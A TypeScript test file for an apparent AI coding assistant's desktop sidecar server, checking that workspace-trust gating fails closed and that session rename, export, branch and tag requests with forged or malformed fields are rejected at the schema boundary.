    { trusted: true, detectedRepo: null, trustRoot: '/repo' },
    () => ({ ok: true, message: 'Workspace already trusted.', changed: false }),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(
    f => f.kind === 'workspace-trust.snapshot',
  ).length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'workspace.trust',
        requestId: 't2',
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(
    received.some(f => f.kind === 'workspace.trust.result' && f.ok),
  ).toBe(true)
  expect(
    received.filter(f => f.kind === 'workspace-trust.snapshot').length,
  ).toBe(before)
})

test('P4-15 — rejects a workspace.trust verb carrying a renderer-authored path (HC1 / checkStrictKeys)', () => {
  let called = 0
  const server = makeWorkspaceTrustServer(
    { trusted: false, detectedRepo: null, trustRoot: '/repo' },
    () => {
      called++
      return { ok: true, message: 'Workspace trusted.', changed: true }
    },
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      // A renderer-supplied `path` is exactly what HC1 forbids — rejected before
      // the verb ever reaches the domain (no path field exists in the contract).
      message: {
        type: 'workspace.trust',
        requestId: 't',
        path: '/etc',
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'workspace.trust.result')).toBe(false)
  expect(called).toBe(0)
})

test('P4-15 — rejects a workspace.trust verb missing requestId at the schema boundary', () => {
  let called = 0
  const server = makeWorkspaceTrustServer(
    { trusted: false, detectedRepo: null, trustRoot: '/repo' },
    () => {
      called++
      return { ok: true, message: 'x', changed: true }
    },
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'workspace.trust',
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'workspace.trust.result')).toBe(false)
  expect(called).toBe(0)
})

test('P4-15 — app.submit at an UNTRUSTED cwd is rejected (unauthorized) and no turn runs', async () => {
  // The renderer trust gate is UX only; the sidecar is the boundary. Any
  // renderer path that dispatches app.submit while untrusted must be refused
  // BEFORE the engine runs tools/hooks at the untrusted cwd.
  let turnRan = false
  const controller = new AppSessionController({
    async *runTurn() {
      turnRan = true
    },
  })
  const server = makeServer(
    controller,
    undefined,
    undefined,
    undefined,
    fakeWorkspaceTrust({ trusted: false, detectedRepo: null, trustRoot: '/repo' }),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    clientFrame({ type: 'app.submit', requestId: 'u1', prompt: 'do harm' }),
  )
  // Give any erroneously-dispatched turn a chance to start.
  await Bun.sleep(50)

  const err = received.find(f => f.kind === 'error' && f.requestId === 'u1')
  expect(err && err.kind === 'error' && err.code).toBe('unauthorized')
  expect(turnRan).toBe(false)
  // No turn side effects: no live user/assistant event frames were broadcast.
  expect(received.some(f => f.kind === 'event')).toBe(false)
})

test('P4-15 — app.submit at a TRUSTED cwd proceeds to a turn (the gate is off when trusted)', async () => {
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    fakeWorkspaceTrust({ trusted: true, detectedRepo: null, trustRoot: '/repo' }),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    clientFrame({ type: 'app.submit', requestId: 't1', prompt: 'hello' }),
  )
  await waitFor(() => received.some(f => f.kind === 'event'))

  expect(received.some(f => f.kind === 'error' && f.code === 'unauthorized')).toBe(false)
  expect(received.some(f => f.kind === 'event')).toBe(true)
})

test('P4-25 — app.submit under a NULL/failed trust snapshot is rejected (fail-closed)', async () => {
  // review B1: a null snapshot (the spawn trust read failed) must NOT read as
  // "permit". The old gate `getSnapshot()?.trusted === false` let null through
  // (`undefined === false` → false → gate skipped → turn ran at an unvetted cwd).
  // This is the tripwire: it fails against the pre-fix `=== false` consumer.
  let turnRan = false
  const controller = new AppSessionController({
    async *runTurn() {
      turnRan = true
    },
  })
  const server = makeServer(
    controller,
    undefined,
    undefined,
    undefined,
    fakeWorkspaceTrust(null),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    clientFrame({ type: 'app.submit', requestId: 'u2', prompt: 'do harm' }),
  )
  // Give any erroneously-dispatched turn a chance to start.
  await Bun.sleep(50)

  const err = received.find(f => f.kind === 'error' && f.requestId === 'u2')
  expect(err && err.kind === 'error' && err.code).toBe('unauthorized')
  expect(turnRan).toBe(false)
  expect(received.some(f => f.kind === 'event')).toBe(false)
})

test('P4-14 — attach emits a diagnostics.snapshot carrying the domain read', () => {
  const diagnostics = fakeDiagnostics({
    version: '2.1.87-dev',
    mainLoopModel: null,
    mainLoopModelForSession: 'gpt-5.6-terra',
    reasoningEffort: 'high',
    fastMode: false,
    sandboxEnabled: true,
    gitBranch: 'migration',
    installationWarnings: [],
    healthWarnings: ['Found invalid settings files: /tmp/x.json. They will be ignored.'],
    memoryWarnings: [],
  })
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    diagnostics,
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  const snap = received.find(f => f.kind === 'diagnostics.snapshot')
  expect(snap).toEqual({
    kind: 'diagnostics.snapshot',
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
    diagnostics: {
      version: '2.1.87-dev',
      mainLoopModel: null,
      mainLoopModelForSession: 'gpt-5.6-terra',
      reasoningEffort: 'high',
      fastMode: false,
      sandboxEnabled: true,
      gitBranch: 'migration',
      installationWarnings: [],
      healthWarnings: ['Found invalid settings files: /tmp/x.json. They will be ignored.'],
      memoryWarnings: [],
    },
  })
})

test('P4-14 — a null diagnostics read degrades to no frame, never strands the connection', () => {
  const diagnostics = fakeDiagnostics(null)
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    diagnostics,
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  expect(received.some(f => f.kind === 'diagnostics.snapshot')).toBe(false)
  expect(received[0]?.kind).toBe('ready')
})

test('P4-14 — absent domains (probe mode) emit neither snapshot, without throwing', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  expect(received.some(f => f.kind === 'workspace-trust.snapshot')).toBe(false)
  expect(received.some(f => f.kind === 'diagnostics.snapshot')).toBe(false)
})

/* ------------------------------------------------------------------------- *
 * P4-6b — session-action WRITE verbs (Rename / Export / Branch) boundary
 * ------------------------------------------------------------------------- *
 * Exercises the SERVER boundary (checkStrictKeys + Zod schema + dispatch + async
 * result frame) with a FAKE domain — the engine-op round-trip is proven in
 * sessionActionsDomain.test.ts. `flush` (declared above) drains the microtask/
 * timer queue so the async result ack (the handler fires it after the domain
 * promise resolves) is observable.
 */
function fakeSessionActionsDomain(): {
  domain: SidecarSessionActionsDomain
  calls: string[]
} {
  const calls: string[] = []
  const domain: SidecarSessionActionsDomain = {
    async rename(title) {
      calls.push(`rename:${title}`)
      return { ok: true, message: `Renamed to ${title}.` }
    },
    async export() {
      calls.push('export')
      return { ok: true, message: 'Transcript exported.', exportText: 'HELLO' }
    },
    async branch() {
      calls.push('branch')
      return {
        ok: true,
        message: 'Branched.',
        branchEngineSessionId: 'fork-id',
      }
    },
    async tag(tag) {
      calls.push(`tag:${tag}`)
      return {
        ok: true,
        message: tag.length === 0 ? 'Tag removed.' : `Tagged #${tag}.`,
      }
    },
  }
  return { domain, calls }
}

function makeSessionActionsServer(): {
  server: SidecarServer
  calls: string[]
} {
  const { domain, calls } = fakeSessionActionsDomain()
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    domain,
  )
  return { server, calls }
}

test('P4-6b — a valid session.rename dispatches + acks ok + relabels via session-title', async () => {
  const { server, calls } = makeSessionActionsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.rename',
        requestId: 'sr1',
        title: 'Renamed Title',
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  const result = received.find(f => f.kind === 'session-action.result')
  expect(result && result.kind === 'session-action.result' && result.ok).toBe(true)
  expect(result && result.kind === 'session-action.result' && result.verb).toBe('rename')
  expect(result && result.kind === 'session-action.result' && result.requestId).toBe('sr1')
  expect(calls).toEqual(['rename:Renamed Title'])
  // The rename reuses the outbound session-title frame → host.setTitle (registry).
  expect(
    received.some(f => f.kind === 'session-title' && f.title === 'Renamed Title'),
  ).toBe(true)
})

test('P4-6b — a valid session.export returns the rendered text on the result', async () => {
  const { server } = makeSessionActionsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.export',
        requestId: 'se1',
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  const result = received.find(f => f.kind === 'session-action.result')
  expect(result && result.kind === 'session-action.result' && result.verb).toBe('export')
  expect(result && result.kind === 'session-action.result' && result.exportText).toBe('HELLO')
})

test('an over-cap export is refused in words the operator can act on', async () => {
  const oversized = 'x'.repeat(MAX_OUTBOUND_FRAME_BYTES - 64 * 1024 + 1)
  const domain: SidecarSessionActionsDomain = {
    async rename(title) {
      return { ok: true, message: `Renamed to ${title}.` }
    },
    async export() {
      return { ok: true, message: 'Transcript exported.', exportText: oversized }
    },
    async branch() {
      return { ok: true, message: 'Branched.', branchEngineSessionId: 'fork-id' }
    },
    async tag() {
      return { ok: true, message: 'Tagged.' }
    },
  }
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    domain,
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.export',
        requestId: 'se-big',
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  const result = received.find(f => f.kind === 'session-action.result')
  expect(result && result.kind === 'session-action.result' && result.ok).toBe(false)
  const message =
    result && result.kind === 'session-action.result' ? result.message : ''
  expect(message).not.toContain('—')
  // "desktop transport" is our own plumbing, not something the operator can act on.
  expect(message).not.toContain('transport')
  expect(message).toContain('/export in the terminal')
})

test('P4-6b — a valid session.branch returns the new fork engine session id', async () => {
  const { server } = makeSessionActionsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.branch',
        requestId: 'sb1',
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  const result = received.find(f => f.kind === 'session-action.result')
  expect(result && result.kind === 'session-action.result' && result.verb).toBe('branch')
  expect(
    result && result.kind === 'session-action.result' && result.branchEngineSessionId,
  ).toBe('fork-id')
})

test('P4-6b — rejects session.rename missing requestId at the schema boundary, no domain call', async () => {
  const { server, calls } = makeSessionActionsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.rename',
        title: 'x',
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  expect(received.some(f => f.kind === 'session-action.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-6b — rejects session.rename with a NON-string title (Zod boundary), no domain call', async () => {
  const { server, calls } = makeSessionActionsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.rename',
        requestId: 'sr2',
        title: 123,
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  expect(received.some(f => f.kind === 'session-action.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-6b — rejects session.export carrying an unexpected key (checkStrictKeys), no domain call', async () => {
  const { server, calls } = makeSessionActionsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.export',
        requestId: 'se2',
        format: 'markdown',
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  expect(received.some(f => f.kind === 'session-action.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-6b — rejects session.branch carrying an unexpected key (checkStrictKeys), no domain call', async () => {
  // `session.branch` had an accept test but no reject direction, so the strict
  // key check for the one verb that FORKS a transcript was unproven.
  const { server, calls } = makeSessionActionsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.branch',
        requestId: 'sb1',
        engineSessionId: 'forged',
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'session-action.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-29 — a valid session.tag dispatches + acks ok under the tag verb', async () => {
  const { server, calls } = makeSessionActionsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.tag',
        requestId: 'st1',
        tag: 'infra',
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  const result = received.find(f => f.kind === 'session-action.result')
  expect(result && result.kind === 'session-action.result' && result.ok).toBe(true)
  expect(result && result.kind === 'session-action.result' && result.verb).toBe('tag')
  expect(result && result.kind === 'session-action.result' && result.requestId).toBe('st1')
  expect(calls).toEqual(['tag:infra'])
  // A tag is not a rename: it must NOT relabel the sidebar/tab.
  expect(received.some(f => f.kind === 'session-title')).toBe(false)
})

test('P4-29 — an EMPTY session.tag is accepted (the engine remove form), not rejected', async () => {
  const { server, calls } = makeSessionActionsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.tag',
        requestId: 'st2',
        tag: '',
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  const result = received.find(f => f.kind === 'session-action.result')
  expect(result && result.kind === 'session-action.result' && result.ok).toBe(true)
  expect(calls).toEqual(['tag:'])
})

test('P4-29 — rejects session.tag with a NON-string tag (Zod boundary), no domain call', async () => {
  const { server, calls } = makeSessionActionsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.tag',
        requestId: 'st3',
        tag: { name: 'infra' },
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  expect(received.some(f => f.kind === 'session-action.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-29 — rejects session.tag carrying an unexpected key (checkStrictKeys), no domain call', async () => {
  // The renderer names ONLY the tag; a forged session id must never ride along.
  const { server, calls } = makeSessionActionsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.tag',
        requestId: 'st4',
        tag: 'infra',
        sessionId: 'forged',
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'session-action.result')).toBe(false)
  expect(calls).toEqual([])
})

test('P4-6b — a session-action verb with NO domain (probe) fails closed with internal_error', async () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'session.branch',
        requestId: 'sb2',
      } as unknown as ClientFrame['message'],
    }),
  )
  await flush()

  expect(received.some(f => f.kind === 'session-action.result')).toBe(false)
  expect(
    received.some(f => f.kind === 'error' && f.requestId === 'sb2'),
  ).toBe(true)
})

test('production app.submit order: the echoed user message, THEN turn.status(true)', async () => {
  // The `roundtrip.probe` socket test drives `controller.submit()` directly
  // (probe mode, `index.ts:287`) and so never exercises `handleSubmit`. The
  // production path echoes the submitted user message BEFORE calling the
  // controller (`:1067`), so the turn boundary lands one frame AFTER the user
  // bubble, not before it. Pinned here because the probe cannot see it, and a
  // report of this change originally got the ordering wrong.
  const controller = new AppSessionController({
    async *runTurn() {
      yield {
        type: 'assistant',
        message: {
          id: 'msg-order',
          role: 'assistant',
          content: [{ type: 'text', text: 'done' }],
        },
        parent_tool_use_id: null,
        session_id: ENGINE_SESSION,
        uuid: '00000000-0000-4000-8000-00000000b001',
      } as never
    },
  })
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    clientFrame({
      type: 'app.submit',
      requestId: 'r-turn-order',
      prompt: 'hello',
    }),
  )
  await waitFor(() =>
    received.some(
      f =>
        f.kind === 'event' &&
        f.event.type === 'turn.status' &&
        f.event.activeTurn === false,
    ),
  )

  const timeline = received
    .filter((f): f is Extract<ServerFrame, { kind: 'event' }> => f.kind === 'event')
    .map(f =>
      f.event.type === 'turn.status'
        ? `turn.status(${f.event.activeTurn})`
        : `message(${(f.event.message as { type?: string }).type})`,
    )

  expect(timeline).toEqual([
    'message(user)',
    'turn.status(true)',
    'message(assistant)',
    'turn.status(false)',
  ])
})
